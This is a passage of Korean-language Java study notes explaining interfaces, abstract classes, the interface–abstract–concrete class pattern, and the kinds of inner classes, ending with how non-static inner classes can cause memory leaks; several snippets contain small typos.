	void swimming() {} // 호랑이는 수영을 할수 없지만 상속 관계로 인해 강제적으로 메소드를 구현해야하는 사태가 일어난다.
}
class People extends Animal {
	void swimming() {
    	// ...
    } 
}

class Whale extends Fish {
	void swimming() {
		// ...
    } 
}

물론 메소드를 선언하기만하고 빈칸으로 놔두면 되기는 하지만,
이는 객체지향설계에 위반될 뿐만아니라 나중에 유지보수면에서도 힘들다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/18.PNG" width="650" height="500" /><br><br>

```
abstract class Creature {}

abstract class Animal extends Creature {}
abstract class Fish extends Creatrue {}

//수영 동작 추상메소드를 따로 인터페이스로 만들어 넣는다.
interface Swimmable {
	void swimming();
}

class Tiger extends Animal {}
class Parrot extends Animal {}
// 인터페이스를 구현함으로써 동작이 필요한 클래스에만 따로 상속에 구애받지않고 묶음
class People extends Animal implements Swimmable {
	@Override
	public void swimming() {}
}
class Whale extends Animal implements Swimmable {
	@Override
	public void swimming() {}
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/19.PNG" width="650" height="500" /><br><br>

```
abstract class Creature {}

abstract class Animal extends Creature {}
abstarct class Fish extends Creature {}

interface Flyable {
	void flying();
}

interface Talkable {
	void talking();
}

interface Swimmable {
	void swimming();
}

class Tiger extends Animal {}
class Parrot extends Animal implements Talkable {
	@Override
	public void talking() {

	}
}
class People extends Animal implements Talkable, Swimmable {
	@Override
	public void talking() {}

	@Override
	public void swimming() {}
}
class Whale extends Fish implements Swimmable{
    @Override
    public void swimming() {}
}
```
```
#)인터페이스 다형성 이용 설계
추상클래스는 클라이언트에서 자료형을 사용하기 전에 미리 논리적인 클래스 상속 구조를 만들어 놓고 사용이 결정되는 느낌이라면, 인터페이스는 반대로 먼저든 나중이든 그때 그때 필요에 따라 구현해서 자유롭게 붙였다 땟다하는 느낌으로 보면 된다.

외부파일에 데이터를 저장하는 라이브러리를 가져와 사용한다고 가정해보자

이 라이브러리안에는 Filesaver 클래스를 이용해 외부파일로 데이터를 저장한다.
이때 Filesaver 클래스를 보면 필드변수로 Storable 인터페이스 타입의 객체를
선언하여 save()메소드에서 인터페이스 타입갹체를 이용하는 것을 볼 수 있다.

즉, Filesaver 클래스는 구체적인 클래스타입으로 통신하는 것이 아닌 인터페이스라는
중개타입을 이용하여 통신하는 것이다.




```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/20.PNG" width="650" height="300" /><br><br>

```
//클래스 데이터를 외부파일로 저장가능하게 만드는 인터페이스
interface Storable {
	int getData();
}

//외부파일에 데이터를 저장하는 클래스
class FileSaver {
	Storable target;

	FileSaver(Storable target) {
		this.target = target;
	}
	int save() {
		//인터페이스 객체 필드의 메서드를 실행하여 값을 가져와 사용
		int data = target.getData();
		//...
	}
}

```
```
그래서 Exam, File, Rectangle 같은 전혀 연관 관계가 없는 클래스들을 FileSaver클래스에
전달해서 데이터를 파일로 저장하기 위해선, 인터페이스로 타입 통합하여 형제관계를 구성하여
FileSaver 클래스의 인터페이스 객체 필드로 넘기는 식으로, 상속에 얽매히지 않은 자유로운
인터페이스 다형성을 이용하는 것으로 볼 수 있는 것이다.



```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/21.PNG" width="650" height="300" /><br><br>

```
class Exam implements Storable { // 인터페이스를 구현함으로서 클래스끼리 형제 관계를 맺음 
    int kor;
    int eng;
    int math;

    void total(){}
    void avg(){}

    // 인터페이스 통신 메소드 구현
    int getData(){
        // ...
    }
}

class File implements Storable { // 인터페이스를 구현함으로서 클래스끼리 형제 관계를 맺음 
    String src;
    
    boolean isFile(){}
    void mkDir(){}
    
    // 인터페이스 통신 메소드 구현
    int getData(){
        // ...
    }
}
```
```
만일 분석 라이브러리를 사용한다고 했을때 Analyzer클래스에서 통신으로 사용되는
Calculateable 인터페이스 타입 객체 필드에 Exam클래스를 전달하기위해 역시 다중 구현이
가능하다는 점을 이용해 Calculateable 인터페이스를 implements만 하면 되는 일이다.

```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/222.PNG" width="650" height="300" /><br><br>

```
interface Calculateable {
	void total();
	void avg();
}
class Analyzer {
	Calculateable caculate;

	void result() {}
}

class Exam implements Storable, Calculateable {
	int kor;
	int eng;
	int math;

	void total() {}
	void avg() {}
	int getData() {}
}

정리하자면, 인터페이스의 다형성은 부모 자식 클래스와 달리 논리적으로 관련이 없는 별개의 클래스들을 다룬다는 점에서, 상속 관계에 얽매히지 않고 구현(implements)만 하면 자유롭게 다형성을 이용할 수 있다고 보면 된다.
```

```
#)인터페이스 + 추상클래스 조합
추상클래스의 중복멤버통합과 인터페이스의 다중 상속 기능을 동시에 사용하기 위해서다.
따라서, 이 둘을 같이 사용하는 여러가지 코드패턴들이 나왔고, 디자인패턴의 근간이 되었다.

#)추상클래스에 인터페이스 일부구현방법
추상 클래스에 인터페이스를 implements 하고, 인터페이스의 추상 메소드를 아예 구현하지 않거나, 혹은 일부만 구현하는 식으로 통합된 추상화 클래스를 만들수 있다.


interface Animal {
    void walk();
    void run();
    void breed();
}

// Animal 인터페이스를 일부만 구현하는 포유류 추상 클래스
abstract class Mammalia implements Animal {
    public void walk() { ... }
    public void run() { ... }
    // breed() 메서드는 자식 클래스에서 구체적으로 구현하도록 일부로 구현하지 않음 (추상 메서드로 처리)
}

// 인터페이스 + 추상 클래스를 상속하여 사용
class Lion extends Mammalia { //breed는 위에서 구현되지않아서 상속받아서 구현해야함
    @Override
    public void breed() { ... }
}
```
```
#)interface - abstract - concrete class 디자인패턴
디자인 패턴은 거창한 논문 이론 그런것 없이 우리가 지금까지 배운 인터페이스와 추상 클래스를 이용한 클래스 설계 패턴일 뿐이다.

인터페이스는 정말 강력한 녀석이지만 필드는 상수만 가능하여, 중복된 필드가 있을 경우 인터페이스로 해결할 수 없다는 단점이 있다. 이때는 어쩔 수 없이 추상 클래스를 사용하여야 한다. 그렇다고 추상 클래스를 남용하면 단일 상속만 되는 제한 때문에 클래스의 의존성이 커지게 된다.
 
따라서 이러한 서로간의 제약들을 극복할 여러 조합 방법이 인터페이스 - 추상클래스 - 클래스 구현 디자인 패턴이다.
```
```
예를들어 개발자로부터 다음과 같은 표준화 인터페이스 코드를 받았다고 하자
interface IShape {
	void setOpacity(double opacity); //도형투명도 지정
	void setColor(String color);
	void draw();
}

우리는 이 Shape 인터페이스에 적힌 스펙대로 도형 클래스를 설계해야한다.


interface IShape {
    void setOpacity(double opacity);
    void setColor(String color);
    void draw();
}

// 인터페이스 설계서에 따라 클래스를 구현
class Rectangle implements IShape {
    double opacity; // ! 중복
    String color; // ! 중복

    public void setOpacity(double opacity) { // ! 중복
        this.opacity = opacity;
    }
    public void setColor(String color) { // ! 중복
        this.color = color;
    }

    public void draw() {
        System.out.println("draw Rectangle with");
        System.out.println(opacity);
        System.out.println(color);
    }
}

// 인터페이스 설계서에 따라 클래스를 구현
class Square implements IShape {
    double opacity; // ! 중복
    String color; // ! 중복

    public void setOpacity(double opacity) { // ! 중복
        this.opacity = opacity;
    }
    public void setColor(String color) { // ! 중복
        this.color = color;
    }

    public void draw() {
        System.out.println("draw Rectangle with");
        System.out.println(opacity);
        System.out.println(color);
    }
}

public class Pattern {
    public static void main(String[] args) {
        IShape[] rec = { new Rectangle(), new Square() };

        rec[0].setOpacity(0.7);
        rec[0].setColor("red");
        rec[0].draw();

        rec[1].setOpacity(0.3);
        rec[1].setColor("yellow");
        rec[1].draw();
    }
}

//이렇게 한눈에 봐도 중복된 코드가 보인다.

인터페이스는 기본적으로 중복되는 멤버에 대해 클래스와 같이 묶어주는 역할을 못한다.
인터페이스에 선언할 수 있는 필드는 오로지 상수이며, 디폴트 메서드가 있더라도 한계가 있다.
```
```
이런 문제점을 해결할 수 있는 방법이 인터페이스와 구체클래스(concrete class)중간에 추상클래스를
하나두고 공통되는 부분을 모아 두는 것이다.

abstract class Shape implements IShape { //인터페이스를 상속하는 추상클래스
	//중복되는 멤버들을 모아 놓고
	protected double opacity;
    protected String color;

    public void setOpacity(double opacity) {
        this.opacity = opacity;
    }
    public void setColor(String color) {
        this.color = color;
    }
    
    // void draw(); 는 구체화 안함
}

그리고 실제 구현 클래스인 Rectangle과 Square클래스에서는 추상클래스 Shape를 extends하고
인터페이스의 draw() 메소드 부분만 구체화 해주면 된다.

class Rectangle extends Shape {
    public void draw() {
        System.out.println("draw Rectangle with");
        System.out.println(opacity);
        System.out.println(color);
    }
}

class Square extends Shape {
    public void draw() {
        System.out.println("draw Rectangle with");
        System.out.println(opacity);
        System.out.println(color);
    }
}


이런식으로 자바에서 제공하는 재료들을 이용하여 각자의 위치에 맞게 여러 조합적인 코드를 짜는 것이 디자인 패턴인 것이다.
다만 위의 방법은 중복 제거에 효과적이지만, 클래스 상속을 기반으로 하고 있기 때문에 다른 클래스를 상속 받아야 하는 경우에는 이 패턴을 활용할 수 없다는 단점이 존재한다. 

이런 경우에는 유명한 디자인 패턴인 Adapter 패턴을 이용하기도 한다. (이름 존재 정도만 알고 넘어가자)
```
```
#)내부클래스
//Creature클래스는 내부 클래스들의 외부클래스
class Creature {
	int life;

	//Animal클래스는 Creature 클래스의 내부클래스
	class Animal {

	}
	//Insect클래스는 Creature클래스의 내부클래스
	class Insect {

	}

	//내부클래스 생성가능
	public void method {
		Animal animal = new Animal();
		Insect insect = new Insect();
	}
}
```
```
#)내부클래스 장점
1. 클래스를 논리적으로 그룹화
클래스가 여러 클래스와 관계를 맺지않고 하나의 특정 클래스와만 관계를 맺는다면, 외부에 클래스를 새로
작성하는 것이 아닌 내부 클래스로 작성할 수 있다.

이런 경우 내부 클래스와 외부 클래스를 함께 관리하는 것이 가능해 유지보수 면에서나 코드 이해성 면에서 편리해진다.

또한 내부 클래스로 인해 새로운 클래스를 생성하지 않아도 되므로 패키지를 간소화할 수 있다.
코드로 예시를 들어보자.

평소대로라면 아래처럼 외부 혹은 다른 파일로 클래스를 선언해놓고, 인스턴스화 하여 사용해왔을 것이다.

class Creature {
	int life;

	public void method() {
		Animal animal = new Animal(); //Animal 객체는 오로지 Creature클래스의 메소드내에서만
		사용된다고 가정하자

	}
}

//외부에 선언된 클래스
class Animal {

}

//그런데 만일 Animal 클래스 자료형이 오로지 Createture클래스의 메소드 내에서만 선언되어 사용된다면,
Animal 클래스를 Creature클래스 내부에 넣어줌으로써 보다 코드 자원의 이해에 도움이 된다.
(한 눈에 자원 상관 관계 파악에 도움된다)

class Creature {
	int life;
	
	//클래스 멤버같이 Creature 클래스 안에다 넣어 선언한다.
	class Animal {

	}
	public void method() {
		Animal animal = new Animal();
	}
}
```
```
2. 더욱 타이트한 캡슐화의 적용
즉, 캡슐화를 통해 외부에서의 접근을 차단하면서도, 내부 클래스에서 외부클래스의 멤버들을 제약없이
쉽게 접근할 수 있어 구조적인 프로그래밍이 가능해진다.

class Creature {
	private int life = 50;

	private class Animal {
		private String name = "호랑이";

		int getOuter() {
			return life; //외부클래스의 private 멤버를 제약없이 접근가능
		}
	}

	public void method() {
		Animal animal = new Animal();
		
		// Getter 없이 내부 클래스의 private 멤버에 접근이 가능
        System.out.println(animal.name); // 호랑이

        // 내부 클래스에서 외부 클래스이 private 멤버를 출력
        System.out.println(animal.getOuter()); // 50
	}
}
```
```
3. 가독성이 좋고 유지관리가 쉬운코드
결국은 내부 클래스를 작성하는 경우 클래스를 따로 외부에 작성하는 경우보다, 
물리적으로 논리적으로 외부 클래스에 더 가깝게 위치하게 된다. 
따라서 시각적으로 읽기가 편해질 뿐 아니라 유지보수에 있어 이점을 가지게 된다.

한 클래스를 다른 클래스의 내부 클래스로 선언하면 두 클래스 멤버들 간에 서로 자유로이 접근할 수 있고, 
그리고 외부에는 불필요한 클래스를 감춰서 클래스간의 연관 관계 따지는 것과 같은 코드의 복잡성을 줄일 수 있다는 장점이 있기 때문이다.

간단하게 말하자면 어차피 A 클래스안에서만 사용하기 위한 클래스이니 괜히 연관관계 생각없이 내부에 선언해 직관적으로 사용하자는 취지인 것이다.
```
```
#)내부클래스 종류
클래스 멤버변수도 선언되는 위치나 접근제어자에 따라 역할과 이름이 달라지듯이,
내부클래스도 선언된 위치, static 키워드의 유무 등에 따라 4가지로 내부클래스가 구분된다.

Tip) 내부클래스에는 아래 표와같이 총 4가지가 있는데 이중에서 중점적으로 봐야할 요소는 static클래스와
익명클래스이다.
추후에 배우겠지만 static클래스는 디자인패턴에서 싱글톤패턴과 Holder패턴에서 쓰이는 기법중 하나이고,
익명클래스는 자바8의 람다 표현식의 기본 골자이기 때문이다.
```
```
내부클래스의 종류
1. 인스턴스 클래스
- 외부 클래스의 멤버변수 선언위치에 선언하며, 외부 클래스의 인스턴스멤버처럼 다뤄진다.
- 주로 외부클래스의 인스턴스멤버들과 관련된 작업에 사용될 목적으로 선언된다.

2. 스태틱 클래스
- 외부클래스의 멤버변수 선언위치에 선언하며, 외부 클래스의 static멤버처럼 다뤄진다.
- 주의할점은 static이라고해서 new생성자 초기화를 못하는 건 아니다.
- 일반적인 static 필드 변수나 static 메서드와 달리, staic 내부 클래스는 같은 static이지만 메모리 구조나 기능이 전혀 다르다.

3. 지역 클래스
- 외부 클래스의 메서드나 초기화 블럭안에 선언하며, 선언된 메서드블록영역 내부에서만 사용될 수 있다.

4. 익명 클래스
- 클래스의 선언과 객체의 생성을 동시에 하는 이름없는 클래스이다.
- 주로 클래스를 일회용으로 사용할 때 자주 이용된다.

class Outer{
	class InstanceInner { ... } // 인스턴스 클래스
	static class StaticInner { ... } // 스태틱 클래스
    
    void method1(){
    	class LocalInner { ... } // 지역 클래스
    }
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/23.PNG" width="650" height="300" /><br><br>

```
#)인스턴스 클래스
- 클래스의 멤버변수 선언부에 위치하고 static 키워드가 없는 내부클래스
- 외부클래스의 멤버로 취급되기때문에 외부클래스의 객체먼저 생성한 후 내부클래스의 객체를 생성이 가능하다.
- 인스턴스 내부클래스에는 instatnce멤버만 선언할 수 있다.(static 멤버는 선언불가 왜냐? 외부클래스가먼저니까)
- 주로 외부클래스의 인스턴스 멤버들과 관련된 작업에 사용될 목적으로 선언된다. 

class PocketBall {
	//인스턴스 변수
	int size = 100;
	int price = 5000;

	//인스턴스 내부 클래스
	class PocketMonster {
		String name = "이상해씨";
		int level = 10;

		//static int cost = 100; - 에러가난다. 인스턴스내부클래스에는 static선언불가
		static final int cost = 100; //final static은 상수이므로 가능

		public void getPocketMember() {
			//별다른 조치없이 외부 클래스 멤버접근가능
			System.out.println(size);
			System.out.println(price);

			//내부클래스 멤버
			System.out.println(name);
			System.out.println(level);
			System.out.println(cost);
		}
	}
}
public class Main {
	public static void main(String[] args) {
		
		PocketBall ball = new PocketBall(); //먼저 외부클래스를 인스턴스화 해주고
		//외부클래스.내부클래스 형식으로 내부클래스를 초기화하여 사용할 수 있다.
		PocketBall.PocketMonster poketmon = ball.new PocketMonster();
		poketmon.getPocketMember();

		//위를 한줄로표현
		PocketBall.PocketMonster poketmon = new PocketBall().new PocketMonster();
	}
}

외부클래스를 인스턴스화하면 외부클래스의 코드가 메모리에 올라오게 되고 이 때 내부클래스의 코드도
메모리에 올라오게된다. 이렇게 코드를 메모리에 올린 이후에야 내부클래스의 인스턴스를 생성할 수가 있다.

다만 내부클래스는 다른 클래스에서 직접사용하는 것보다 해당(외부)클래스에서만 사용하는 것이 일반적이다.
위의 메인코드와 같이 내부클래스의 인스턴스를 다른 클래스에서 만드는 경우는 드물다.

```
```
#)이름이 같은 외부클래스 메서드 호출
만일 다음과 같이 내부클래스에서 외부클래스와 동일한 메서드명을 사용할 때 외부클래스의 메서드를 호출하려면?

//외부클래스
public class Main {
	public print(String txt) {
		System.out.println(txt);
	}

	//내부클래스
	class Sub {
		public print() { //이렇게 메서드가 같다.

		}
	}
}
```
```
클래스가 상속관계에 있을때는 super 키워드를 통해 부모메서드를 호출할 수 있었다.
외부-내부 클래스는 상속관계가 아니기 때문에 다른방법으로 외부클래스의 멤버를 호출해야한다.

이때 정규화된 this를 사용하면 바깥 인스턴스의 메서드를 호출하거나 바깥 인스턴스의 참조를 가져올수있다.

정규환된 this란 클래스명.this 형태로 바깥클래스의 이름을 명시하는 용법

아래와 같이 사용한다.


public class Main {
	public void print(String txt) {
		System.out.println(txt);
	}

	class Sub {
		public void print() {
			Main.this.print("외부 클래스 메소드 호출");
			System.out.println("내부 클래스 메소드 호출");
		}
	}
}
public static void main(String[] args) {
	Main.Sub s = new Main().new Sub();
	s.print();
	//결과
	//외부클래스 메소드 호출
	//내부클래스 메소드 호출
}

Tip) 이 다음에 배울 static 내부클래스에서는 정규화된 this 문법을 사용 할 수 없다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/24.PNG" width="650" height="300" /><br><br>

```
#)스태틱클래스
- static 키워드가 붙은 내부클래스
- 단, 일반적인 static 필드변수나 static 메서드와 똑같이 생각하면 안된다.
- static 클래스 내부에는 instance 멤버와 static 멤버 모두 선언할 수있다.
- 그러나 일반적인 static 메서드와 동일하게 외부 클래스의 인스턴스멤버에는 접근이 불가하고,
정적멤버(static)에만 접근 할 수 있다.

class PocketBall {
	int size = 100;
	static int price = 5000;

	//static 내부클래스
	static class PocketMonster {
		static String name = "이상해씨";
		int level = 10;

		public static void getPocketMember() {
			//외부클래스 인스턴스 멤버 접근 불가능
			//System.out.println(size);

			//외부클래스의 스태틱 멤버도 접근가능
			System.out.println(price);

			//내부클래스 멤버도 스태틱 멤버만 접근가능
			System.out.println(name);
			//System.out.println(level); //에러
		}
	}
}
public class Main {
	public static void main(String[] args) {
		//스태틱 내부클래스의 인스턴스는 외부 클래스를 먼저 생성하지 않아도 된다.
		PocketBall.PocketMonster poketmon = new PocketBall.PocketMonster();
		System.out.println(pocketmon.level);
		System.out.println(PocketBall.PocketMonster.name);

		//클래스.정적내부클래스.정적메소드()
		PocketBall.PocketMonster.getPocketMember();
	}
}

```
```
#)static 클래스에 대한 오해
가장 많은 사람들이 실수하는 오해가 static 클래스가 static필드변수나 static메소드와 같이,
'static'이니까 메모리에 하나만 올라가는 인스턴스로 착각한다는 점이다.

우선 결론부터 말하면 static 클래스는, 키워드가 static이 들어갔을뿐이지, 우리가 알던 static멤버와는
전혀다르다.

아래를 보면 static변수는 우리의 예상대로 메모리에서 한번만 생성되니까 반환되는 데이터는 같다.

하지만 내부 static 클래스는 일반클래스처럼 초기화를 할때마다 다른 객체가 만들어짐을 볼 수 있다.
(static인데 말이다..)


public class Main {
	//스태틱 필드 변수
	static Integer num = new Integer(0);

	//내부 인스턴스 클래스
	class InnerClass {

	}

	//내부 스태틱 클래스
	static class InnerStaticClass {

	}

	public static void main(String[] args) {
		//스태틱필드 변수는 유일해서 서로같다.
		Integer num1 = Main.num;
		Integer num2 = Main.num;
		System.out.println(num1 == num2); //true

		//생성된 내부클래스 인스턴스는 서로 다르다.
		Main.InnerClass inner1 = new Main().new InnerClass();
		Main.InnerClass inner2 = new Main().new InnerClass();
		System.out.println(inner1 == inner2); //false

		//생성된 내부 스태틱 클래스 인스턴스는 서로 다르다.
		(바로 내부static클래스 InnerStaticClass생성가능)
		Main.InnerStaticClass static1 = new InnerStaticClass();
		Main.InnerStaticClass static2 = new InnerStaticClass();
		System.out.println(static1 == static2); //false
	}
}
```
```
복잡하게 생각할 필요없이 static 클래스는 static이라고해서 메모리에 한번만 로드되는 객체 개념이
아닌 것이다.

즉, 내부인스턴스 클래스처럼 외부인스턴스를 먼저 선언하고 초기화해야 하는 선수작업 필요없이,
내부클래스의 인스턴스를 바로 생성할 수 있다는 차이점이 존재할 뿐이다.
```
```
#)내부클래스는 static클래스로 선언하자
만일 내부클래스를 이용하는데, 내부 클래스에서 바깥 외부의 인스턴스를 사용할 일이 없다면 static클래스로
선언해주어야한다. 

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/25.PNG" width="650" height="300" /><br><br>

```
왜냐하면 static이 아닌 내부 인스턴스 클래스는 외부와 연결되어 있어
외부참조를 갖게되어 메모리를 더먹고, 느리며, 또한 GC대상에서 제외되는 여러문제점을 일으킨다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/26.PNG" width="650" height="300" /><br><br>

```
#)로컬클래스
- 메소드 내부에 위치하는 클래스(지역변수와 같은 성질을 지님)
- 지역변수처럼 해당메서드 내부에서만 한정적으로 사용된다.
(해당 메서드 실행 외에는 클래스 접근 및 사용불가)
- 접근제한자와 static을 붙일 수 없다.
(메서드 내부에서만 사용되므로 접근을 제한할 필요가 없고, 원래 메소드내에는 static멤버를
선언할 수 없기 때문이다.)

class PocketBall {
	int size = 100;
	int price = 5000;

	public void pocketMethod() {
		int exp = 5000;

		//메소드 내에서 클래스를 선언
		class PocketMonster {
			String name = "이상해씨"
			int level = 10;

			public void getPocketLevel() {
				System.out.println(level); //인스턴스 변수 출력
				System.out.println(exp); //메소드 지역 상수 출력
			}
		}
		//메소드내에서 또 클래스를 선언
		class PocketMonster2 {
			String name = "리자몽"
			int level = 50;
		}
		//또 메소드내에서
		new PocketMonster().getPocketLevel();
		System.out.println("메소드 실행 완료");
	}
}

메소드 내에서 잠시 사용하는 지역 변수 개념과 같이 지역 클래스 자료형을 사용하고 버리는 것으로 이해하면됨

메소드 내의 모든 내용은 스택 프레임안에 생성됐다가 메소드 종료시 사라지게 되므로,
당연히 다른곳에서는 접근 및 사용자체가 불가능하다.

메소드 내에서 인스턴스를 생성한 후 사용하고 메소드 종료와 함께 레퍼런스가 사라지면서 힙 메모리 영역의 실제 데이터도 나중에 GC(가비지 컬렉터)에 의해 지워지게 된다.

```
```
#)로컬클래스 지역 상수 접근
- 메소드내의 로컬클래스에서 지역변수에 접근해서 값을 사용하려고 할 때 반드시
final 상수화된 지역변수만 사용이 가능하다.
- 변수에 final을 안붙여도 실행이 되는 이유는, jdk1.8부터 지역클래스에서 접근하는 지역변수앞에
final을 생략할 수 있기 때문이다.(컴파일러가 자동으로 붙여줌)
- 그러나 지역변수(상수)의 값이 바뀌는 문장이 있으면 이는 상수가 아닌 변수이니,
컴파일 에러가 발생한다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/27.PNG" width="650" height="300" /><br><br>

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/28.PNG" width="650" height="300" /><br><br>

```
#)익명클래스
- 익명클래스는 클래스이름이 존재하지 않는 이너클래스이다.
- 단 하나의 객체만을 생성하는 일회용 클래스
- 클래스의 선언과 동시에 객체를 생성
- 익명 클래스는 생성자가 존재하지 않는다.
- 익명 클래스는 기존에 존재하는 클래스를 메서드내에서 일회용으로 클래스 내부 구성을 선언하여
필요한 메서드를 재정의하여 사용하는 기법

public class Main {
	public static void main(String[] args) {
		//Object클래스를 일회성으로 익명클래스로 선언하여 변수 o에 저장
		Object o = new Object(){
			@Override
			public String toString() {
				return "내 마음대로 toString 바꾸기~";
			}
		};
		//익명클래스의 객체의 오버라이딩한 메서드를 사용
		String txt = o.toString();
		System.out.println(txt); //내 마음대로 toString 바꾸기~
	}
}

```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/29.PNG" width="650" height="300" /><br><br>

```
#)InnerClass 의 문제점
내부클래스가 외부의 멤버를 참조하여 사용하지 않을 경우

메세지 내용을 보아하니 내부클래스를 인스턴스가 아닌 static으로 설정하라는 경고이다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/30.PNG" width="650" height="300" /><br><br>

```
왜냐하면 inner클래스는 inner static 클래스보다 메모리를 더 먹고, 더 느리고, 바깥 클래스가 GC대상에서
빠져버려 메모리관리가 안될 수 있기 때문이다.
```
```
#)Inner클래스는 외부참조를 한다.
일반적으로 내부 인스턴스 클래스를 만들기 위해서는 먼저 외부클래스를 초기화한 뒤 내부 클래스를 초기화
해야한다.

이러한 단계 과정때문에 inner클래스는 자신을 만들어준 인스턴스에 대한 '외부참조'를 갖게된다.

심지어 내부클래스가 외부의 멤버를 사용하지 않아도, 숨겨진 외부참조가 생성된다.

다음 코드는 내부클래스가 외부의 멤버를 가져와 사용하지 않아도, 외부 참조를 하고 있는지
실험하기 위한 코드이다.

아래의 코드를 컴파일하여 .class 파일로 만들어보자

public class Outer_Class {
	int field = 10;

	class Inner_Class {
		int inner_field = 20;
	}
}
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/31.PNG" width="650" height="300" /><br><br>

```
이처럼 비정적(non-static) 멤버 클래스의 인스턴스는 바깥 클래스의 인스턴스와 암묵적으로 연결된다.

그래서 비정적 멤버 클래스의 인스턴스 메서드에서 정규화된 this를 사용해 바깥 인스턴스의 메서드를
호출하거나 바깥 인스턴스의 참조를 가져올 수 있게 된다.

정규화된 this란 클래스명.this 형태로 바깥클래스의 이름을 명시하는 용법을 말한다.

public class Outer_Class {
	int field = 10;
	int getField() {
		return field;
	}

	class Inner_Class {
		int inner_field = 20;
		int getOuterfield() {
			return Outer_Class.this.getField(); //숨은 외부참조가 있기 때문에 가능
		}
	}
}
```
```
#)Inner클래스의 메모리 누수 현상
하지만 위와 같은 기능적 장점보다는 '외부참조'로 인한 메모리 누수라는 치명적인 단점이 존재한다.

Inner 클래스가 바깥 클래스를 외부 참조 함으로써, 만일 외부 클래스는 필요가 없어지고 내부 클래스만 남아있을경우, 
필요없어진 외부 클래스를 GC 대상으로 삼아 메모리에서 제거해야 되지만 외부 참조로 내부 클래스와
연결되어 있기 때문에 메모리에서 제거가 안되고 잔존하게 되고 이는 곧 메모리 누수로 프로그램이 터지게 된다.

여기서 int형 배열필드 data는 객체의 크기를 불리기 위해 큰 데이터를 저장하기 위한 곳이다.

이곳에 생성자를 통해 100000000 크기의 배열 사이즈를 넣어 생성해줌으로써,  
int형 크기인 4byte x 100000000 = 400MB 크기의 객체를 생성시킬 예정이다.


class Outer_Class {
	//외부클래스 객체의 크기를 불리기 위한 배열변수
	private int[] data;

	//내부클래스
	class Inner_Class {
		
	}

	//외부클래스 생성자
	public Outer_Class(int size) {
		data = new int[size]; //사이즈를 입력받아 배열 크기를 늘림
	}

	//내부클래스 객체를 생성하여 반환하는 메소드
	Inner_Class getInnerObject() {
		return new Inner_Class();
	}
}

public class Main {
	public static void main(String[] args) {
		//Inner_Class 객체를 저장할 리스트
		ArrayList<Object> al = new ArrayList<>();

		for(int counter = 0; counter < 50; counter++) {
			//Inner_Class 객체를 생성하기 위해 Outer_Class를 초기화하고 메서드를 호출하여 
			  리스트에 넣는다.
			//이때, Outer_Class 객체는 메소드 호출용으로 일회용으로 사용되고 버려지기 때문에
			  GC 대상이 되어야한다.
			al.add(new Outer_Class(100000000).getInnerObject); //반복하면 총 400MB이상
		}
	}
}

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/32.PNG" width="650" height="300" /><br><br>

```
코드를 실행한 결과는 메모리가 터져 OutOfMemoryError 예외가 발생됨을 볼 수 있다.
왜냐하면 GC가 정상적으로 Unreachable 한 데이터를 수거해가지 못했기 때문에 메모리 관리가 안되어
메모리 누수가 되었기 때문이다.

원래라면 메소드 호출용도로만 쓰여진 일회용 객체는 바로 GC 수거 대상이 되어 제거되어야 되지만,
내부 클래스에서 외부 클래스를 참조하고 있는 관계 때문에, 
내부 클래스 데이터가 살아있는 한 외부 클래스 데이터도 계속살아있어 400MB라는 엄청난 데이터가
지속적으로 메모리에 쌓이게 되어 프로그램이 터지게 된 것이다.

```

```
#)내부클래스는 static으로 선언하자
정적멤버클래스와 비정적멤버클래스의 구문상 차이는 단지 static이 붙어있고 없고 뿐이지만
의미상 차이는 꽤 크다.

#)static inner 클래스는 외부 참조를 안한다.
위에서 사용했던 코드를 그대로 가져와 내부클래스에 static 키워드를 붙이고 컴파일을 해보자

public class Outer_Class {
	int field = 10;

	//static inner class
	static class Inner_Class {
		int inner_field = 20;
	}
}
```
